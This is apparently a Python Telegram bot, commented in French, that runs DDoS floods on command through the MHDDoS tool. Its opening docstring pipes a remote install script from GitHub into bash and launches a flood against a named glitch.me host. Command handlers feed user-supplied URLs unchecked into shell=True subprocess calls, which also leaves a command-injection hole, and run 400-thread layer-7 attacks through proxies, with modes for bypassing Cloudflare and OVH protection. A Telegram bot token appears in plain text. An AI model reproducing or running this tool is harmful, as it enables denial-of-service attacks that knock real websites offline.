"""
/usr/bin/python3 -m pip install --upgrade pip
pip3 uninstall telegram && pip3 uninstall telegram-bot python-telegram-bot && pip3 install -r requirements.txt &&git clone https://github.com/MatrixTM/MHDDoS.git && cd MHDDoS && pip3 install -r requirements.txt && curl -s https://raw.githubusercontent.com/SlavaUkraineSince1991/DDoS-for-all/main/scripts/python_git_MHDDoS_proxy_install.sh | bash && python3 ~/MHDDoS/start.py GET panpan-bot1.glitch.me 1 100 mhddos_proxy/list 100 5
"""

import requests
import telegram
#from telegram import Update
from telegram.ext import Updater, CallbackContext, CommandHandler, MessageHandler, Filters
from telegram.update import Update
import re 
import os
import subprocess


#Telegram token
token = os.getenv('6102051751:AAHkvJp58CK1xpiveTrQ1WwWYEOkTlYZQic')
bot_number = os.getenv('2')
updater = Updater(token,use_context=True)


def start(update: Update, context: CallbackContext):
  update.message.reply_text(f"DDOS BOT {bot_number}")


def ddos(update: Update, context: CallbackContext):
  url = update.message.text.replace('/ddos', '')
  update.message.reply_text("METHOD: GET L7 THREADS : 400")
  url_str = str(url)
  print(url_str)
  p = subprocess.Popen(f'python3 ~/MHDDoS/start.py GET {url_str} 1 400 mhddos_proxy/list 100 360', stdout=subprocess.PIPE, shell=True)
  output, error = p.communicate()
  if error:
    update.message.reply_text(f'Erreur : {error.decode()}')
  else:
     # Divise l'output en plusieurs parties
    parts = output.decode().split('\n')
    
    # Envoie chaque partie de l'output au chat
    for part in parts:
      chat_id = str(update.effective_user.id)
      update.message.bot.send_message(
        chat_id = chat_id,
        text=part,
        disable_web_page_preview=True,
        parse_mode='HTML'
      ) 
      
def google_bot(update: Update, context: CallbackContext):
  url = update.message.text.replace('/bot', '')
  update.message.reply_text("METHOD: BOT L7 THREADS : 400\n\nBOT: Like Google bot ")
  url_str = str(url)
  print(url_str)
  p = subprocess.Popen(f'python3 ~/MHDDoS/start.py BOT {url_str} 1 400 mhddos_proxy/list 100 360', stdout=subprocess.PIPE, shell=True)
  output, error = p.communicate()
  if error:
    update.message.reply_text(f'Erreur : {error.decode()}')
  else:
     # Divise l'output en plusieurs parties
    parts = output.decode().split('\n')
    
    # Envoie chaque partie de l'output au chat
    for part in parts:
      chat_id = str(update.effective_user.id)
      update.message.bot.send_message(
        chat_id = chat_id,
        text=part,
        disable_web_page_preview=True,
        parse_mode='HTML'
      )       

      
def STRESS(update: Update, context: CallbackContext):
  url = update.message.text.replace('/stress', '')
  update.message.reply_text("METHOD: STRESS L7 THREADS : 400\n\nSTRESS: Send HTTP Packet With High Byte ")
  url_str = str(url)
  print(url_str)
  p = subprocess.Popen(f'python3 ~/MHDDoS/start.py STRESS {url_str} 1 400 mhddos_proxy/list 100 360', stdout=subprocess.PIPE, shell=True)
  output, error = p.communicate()
  if error:
    update.message.reply_text(f'Erreur : {error.decode()}')
  else:
     # Divise l'output en plusieurs parties
    parts = output.decode().split('\n')
    
    # Envoie chaque partie de l'output au chat
    for part in parts:
      chat_id = str(update.effective_user.id)
      update.message.bot.send_message(
        chat_id = chat_id,
        text=part,
        disable_web_page_preview=True,
        parse_mode='HTML'
      )
      
def CFB(update: Update, context: CallbackContext):
  url = update.message.text.replace('/CFB', '')
  update.message.reply_text("METHOD: CFB L7 THREADS : 400\n\nCFB: CloudFlare Bypass (Ajoute des user-agents)")
  url_str = str(url)
  print(url_str)
  p = subprocess.Popen(f'python3 ~/MHDDoS/start.py CFB {url_str} 1 400 mhddos_proxy/list 100 360', stdout=subprocess.PIPE, shell=True)
  output, error = p.communicate()
  if error:
    update.message.reply_text(f'Erreur : {error.decode()}')
  else:
     # Divise l'output en plusieurs parties
    parts = output.decode().split('\n')
    
    # Envoie chaque partie de l'output au chat
    for part in parts:
      chat_id = str(update.effective_user.id)
      update.message.bot.send_message(
        chat_id = chat_id,
        text=part,
        disable_web_page_preview=True,
        parse_mode='HTML'
      )  
      
def CFBUAM(update: Update, context: CallbackContext):
  url = update.message.text.replace('/CFBUAM', '')
  update.message.reply_text("METHOD: CFBUAM L7 THREADS : 400\n\nCFBUAM: CloudFlare Under Attack Mode Bypass (Met un referrer : facebook.com//lesite.com ou un site du genre pour bypass)")
  url_str = str(url)
  print(url_str)
  p = subprocess.Popen(f'python3 ~/MHDDoS/start.py CFBUAM {url_str} 1 400 mhddos_proxy/list 100 360', stdout=subprocess.PIPE, shell=True)
  output, error = p.communicate()
  if error:
    update.message.reply_text(f'Erreur : {error.decode()}')
  else:
     # Divise l'output en plusieurs parties
    parts = output.decode().split('\n')
    
    # Envoie chaque partie de l'output au chat
    for part in parts:
      chat_id = str(update.effective_user.id)
      update.message.bot.send_message(
        chat_id = chat_id,
        text=part,
        disable_web_page_preview=True,
        parse_mode='HTML'
      )    
      
def TOR(update: Update, context: CallbackContext):
  url = update.message.text.replace('/tor', '')
  update.message.reply_text("METHOD: CFB L7 THREADS : 400\n\nTOR: Bypass onion website")
  url_str = str(url)
  print(url_str)
  p = subprocess.Popen(f'python3 ~/MHDDoS/start.py TOR {url_str} 1 400 mhddos_proxy/list 100 360', stdout=subprocess.PIPE, shell=True)
  output, error = p.communicate()
  if error:
    update.message.reply_text(f'Erreur : {error.decode()}')
  else:
     # Divise l'output en plusieurs parties
    parts = output.decode().split('\n')
    
    # Envoie chaque partie de l'output au chat
    for part in parts:
      chat_id = str(update.effective_user.id)
      update.message.bot.send_message(
        chat_id = chat_id,
        text=part,
        disable_web_page_preview=True,
        parse_mode='HTML'
      )        
      
def OVH(update: Update, context: CallbackContext):
  url = update.message.text.replace('/ovh', '')
  update.message.reply_text("METHOD: OVH L7 THREADS : 400\n\nOVH: Bypass OVH")
  url_str = str(url)
  print(url_str)
  p = subprocess.Popen(f'python3 ~/MHDDoS/start.py OVH {url_str} 1 400 mhddos_proxy/list 100 360', stdout=subprocess.PIPE, shell=True)
  output, error = p.communicate()
  if error:
    update.message.reply_text(f'Erreur : {error.decode()}')
  else:
     # Divise l'output en plusieurs parties
    parts = output.decode().split('\n')
    
    # Envoie chaque partie de l'output au chat
    for part in parts:
      chat_id = str(update.effective_user.id)
      update.message.bot.send_message(
        chat_id = chat_id,
        text=part,
        disable_web_page_preview=True,
        parse_mode='HTML'
      )        
            
      
      
def stop(update: Update, context: CallbackContext):
  update.message.reply_text("OK je refresh")
  a = subprocess.Popen(f'refresh', stdout=subprocess.PIPE, shell=True)
  output, error = a.communicate()      
      
      

#Trigger des fonctions
updater.dispatcher.add_handler(CommandHandler('ddos', ddos))
updater.dispatcher.add_handler(CommandHandler('start', start))
updater.dispatcher.add_handler(CommandHandler('stop', stop))
updater.dispatcher.add_handler(CommandHandler('bot', google_bot))
updater.dispatcher.add_handler(CommandHandler('stress', STRESS))
updater.dispatcher.add_handler(CommandHandler('cfb', CFB))
updater.dispatcher.add_handler(CommandHandler('cfbuam', CFBUAM))
updater.dispatcher.add_handler(CommandHandler('tor', TOR))
updater.dispatcher.add_handler(CommandHandler('ovh', OVH))
#Run the bot
updater.start_polling()
